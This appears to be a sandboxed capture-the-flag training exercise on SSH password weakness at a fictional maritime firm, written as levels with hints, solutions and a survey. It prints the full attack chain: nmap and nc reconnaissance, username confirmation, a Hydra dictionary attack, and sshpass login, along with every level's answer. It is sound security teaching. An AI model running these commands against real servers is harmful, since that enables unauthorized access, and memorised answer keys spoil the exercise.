title: SSH Weak Password — Halcyon Marine Systems
description: Recover a weak SSH password with a dictionary attack against a maritime logistics server, log in as the dockyard operator, read the flag, and discover a second sensitive file in the account home directory.
outcomes: Identify the SSH service port and software version using nmap.
Enumerate the target username from contextual clues and mount a dictionary attack with Hydra.
Authenticate via SSH using the recovered credential and read a protected flag file.
Identify every file in the operator's home directory, including a second wordlist used in the attack.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Complete each level before moving to the next. Skipping ahead will leave you without the credentials you need.
* Use hints when stuck — they cost points, but a hint is always cheaper than giving up.
* Only attack the systems in your sandbox.

# Storyline

You are a junior penetration tester assigned to **Halcyon Marine Systems**, a maritime logistics firm managing cargo movements across a busy commercial port. The company recently connected their dockyard operations server to the internet to allow remote maintenance access by a third-party IT contractor. Your job is to determine whether that access is adequately secured.

Your brief: the server runs SSH for remote administration. The contractor provisioned a dockyard operator account with a password that 'passes the complexity rules but is easy for the team to remember'. That phrasing is the red flag — maritime operations teams often use industry-specific vocabulary (ship names, ranks, sailing terminology, weather conditions) for passwords, vocabulary that does not appear in general-purpose wordlists but is predictable to anyone familiar with the sector.

Weak and predictable passwords remain the most common initial access vector in real-world intrusions. Dictionary attacks with targeted wordlists — tailored to the victim organisation's context — are significantly more effective than generic brute-force. A 10-million-word general wordlist misses 'Sailor2024', while a 500-word maritime-themed wordlist finds it almost immediately.

This exercise walks you through the full chain: service discovery, version fingerprinting, credential brute-forcing, authentication, and data retrieval. When you log in you will find two files in the operator's home: the flag, and the wordlist that cracked the password — a deliberate detail reinforcing the lesson that sector-specific wordlists are a real tool in targeted attacks.

By the end of this exercise you will have a hands-on understanding of why default or thematically predictable passwords are insufficient, and why organisations must enforce both complexity rules and a minimum entropy threshold that resists sector-specific dictionary attacks.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.32.23**, then begin reconnaissance:

```
nmap -sV -p 22 10.1.32.10
```

The target server is at **10.1.32.10**. Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
Begin reconnaissance on the local target:

```
nmap -sV -p 22 127.0.0.1
```

Or connect directly: `ssh student@127.0.0.1 -p 2222`. Submit **start** to begin.

levels.title: Identify the SSH Service Port
levels.content:
Begin with port scanning to confirm which port the SSH service is listening on and to collect version information.

Run a targeted version-detection scan:

```
nmap -sV -p 1-1024 10.1.32.10
```

The output will list each open port, the service name, and the detected version string. Look for the port associated with `ssh` in the service column.

Knowing the exact port matters: some servers run SSH on non-standard ports (e.g. 2222, 22222) as a weak deterrent against automated scanning. In this case the server uses the standard port, but always confirm — Hydra needs the correct port number to target.

**What port number is the SSH service listening on?**
levels.solution:
```
$ nmap -sV -p 1-1024 10.1.32.10
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu ...
```

SSH is on port **22**.

hints.title: How to scan with nmap
hints.content: Run: nmap -sV -p 1-1024 10.1.32.10. The -sV flag enables version detection. Look for the line where the SERVICE column says 'ssh'.

hints.title: The SSH port
hints.content: SSH runs on port 22 by default. The nmap output will show: 22/tcp open ssh OpenSSH...

levels.title: Identify the SSH Software
levels.content:
Your nmap scan returned a version string for the SSH service. Read the VERSION column of the nmap output carefully.

Alternatively, connect directly and read the banner:

```
nc 10.1.32.10 22
```

The server will immediately print its SSH protocol banner, which includes the implementation name and version. Common SSH implementations include OpenSSH (the dominant choice on Linux/Unix), Dropbear (common on embedded devices), and libssh.

Knowing the implementation matters for two reasons:
1. Different implementations have different known vulnerabilities at specific version numbers.
2. Authentication behaviour and error messages differ — affecting how brute-force tools like Hydra interpret responses.

**What is the name of the SSH software running on the target?** (first word only)
levels.solution:
```
$ nc 10.1.32.10 22
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
```

The software is **OpenSSH**.

hints.title: How to read the SSH banner
hints.content: Run: nc 10.1.32.10 22. The server responds immediately with its banner: SSH-2.0-OpenSSH_X.Y... The first word after SSH-2.0- is the software name.

hints.title: What to look for
hints.content: The banner format is SSH-2.0-OpenSSH_version. The software name is OpenSSH — just the first word before the underscore.

levels.title: Enumerate the Target Username
levels.content:
Before running a password attack you need a username. In real-world engagements, usernames are gathered from OSINT: LinkedIn job titles, email address formats, company directories, or breach data.

Your brief mentions a 'dockyard operator account'. In maritime contexts, 'deckhand' is a standard crew rank — the kind of label an IT department at a maritime company would use as an account name for their dockyard operations system.

Verify the username exists by attempting an SSH connection:

```
ssh deckhand@10.1.32.10
```

Enter any wrong password — if the server returns 'Permission denied (publickey,password)' rather than 'Invalid user', the username exists and password authentication is enabled.

**What is the username of the dockyard operator account?**
levels.solution:
```
$ ssh deckhand@10.1.32.10
deckhand@10.1.32.10's password:
Permission denied, please try again.
```

The username is **deckhand** — confirmed valid by the server's response.

hints.title: What context clues to use
hints.content: The brief mentions a 'dockyard operator'. In maritime terminology, a deckhand is a dockyard crew member. Try 'deckhand' as the username.

hints.title: How to confirm the username
hints.content: Run: ssh deckhand@10.1.32.10. If the server prompts for a password (rather than saying 'Invalid user'), the account exists.

levels.title: Crack the Password with Hydra
levels.content:
Run a dictionary attack against the SSH service using Hydra. You will need a wordlist — the scenario includes one at `/usr/share/wordlists/ssh-weak-v2.txt` on the attacker machine. Alternatively, create a small maritime-themed wordlist yourself:

```
hydra -l deckhand \
  -P /usr/share/wordlists/ssh-weak-v2.txt \
  -t 4 \
  ssh://10.1.32.10
```

Flags explained:
- `-l deckhand` — the target username (known from the previous level)
- `-P /usr/share/wordlists/ssh-weak-v2.txt` — dictionary file
- `-t 4` — four parallel threads (avoids overloading SSH)
- `ssh://10.1.32.10` — target protocol and IP

Hydra will print `[22][ssh] host: 10.1.32.10 login: deckhand password: XXXX` when it finds a match.

**What password did Hydra recover for the deckhand account?**
levels.solution:
```
$ hydra -l deckhand -P /usr/share/wordlists/ssh-weak-v2.txt -t 4 ssh://10.1.32.10
[22][ssh] host: 10.1.32.10 login: deckhand password: Sailor2024
```

The password is **Sailor2024**.

hints.title: Hydra command structure
hints.content: hydra -l deckhand -P /usr/share/wordlists/ssh-weak-v2.txt -t 4 ssh://10.1.32.10. The -l flag is the username, -P is the wordlist path, -t 4 limits threads.

hints.title: How to read the output
hints.content: Hydra prints the found credentials as: [22][ssh] host: 10.1.32.10 login: deckhand password: XXXX. The password is the word after 'password:'.

levels.title: Retrieve the Flag
levels.content:
You have the credentials. Authenticate via SSH and read the flag:

```
sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10
```

Once logged in, the flag is in `manifest.txt` in the home directory:

```
cat ~/manifest.txt
```

The file is mode `0600` — readable only by the owner. From outside the account (without SSH access) this file cannot be reached. The brute-forced credential is the only way in.

**Submit the flag from manifest.txt.**

hints.title: How to log in and read the file
hints.content: Run: sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'cat ~/manifest.txt'. The sshpass tool passes the password non-interactively.

hints.title: Where the flag is
hints.content: The flag is in the file ~/manifest.txt in the deckhand home directory. Use cat to read it after logging in.

hints.title: Flag format
hints.content: The flag starts with WMG{ and ends with }.

levels.title: Discover the Wordlist File
levels.content:
Log in as deckhand and list the home directory:

```
sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'ls -la ~'
```

You will see two files: `manifest.txt` (which you already read) and a second file. That second file is the maritime-themed password wordlist used in this attack — stored by the IT department in the operator account home for 'convenience'. In a real compromise this file would be a treasure: a ready-made wordlist for attacking other systems at the same organisation.

Note the permissions on the home directory itself (mode `0700`) — only deckhand can list it. Without the SSH credential, no other user on the system can see what files are in this directory.

**What is the filename of the wordlist file in the deckhand home directory?**
levels.solution:
```
$ sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'ls -la ~'
total 20
drwx------ 2 deckhand deckhand 4096 ... .
drwxr-xr-x 3 root     root     4096 ... ..
-rw-r--r-- 1 deckhand deckhand  ... crew-passwords.txt
-rw------- 1 deckhand deckhand  ... manifest.txt
```

The second file is **crew-passwords.txt**.

hints.title: How to list the home directory
hints.content: Run: sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'ls -la ~'. Look for a file that is not manifest.txt.

hints.title: What the second file is
hints.content: There are two files in the home directory. One is manifest.txt (the flag file). The other is a wordlist — a text file with a maritime-themed name.

hints.title: The filename
hints.content: The wordlist file is called: crew-passwords.txt

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve this game.

questions.text: How difficult did you find this game?
Before this game, had you used Hydra to crack SSH passwords?

choices.text: Yes, I had done this before
I knew about Hydra but had not used it
No, this was completely new to me

questions.text: How clear were the level instructions?
What is the most effective control to prevent SSH dictionary attacks?

choices.text: Disable password authentication and use SSH keys only
Change SSH to a non-standard port
Use fail2ban to temporarily block failed logins

questions.text: What would you change or add to improve this game?
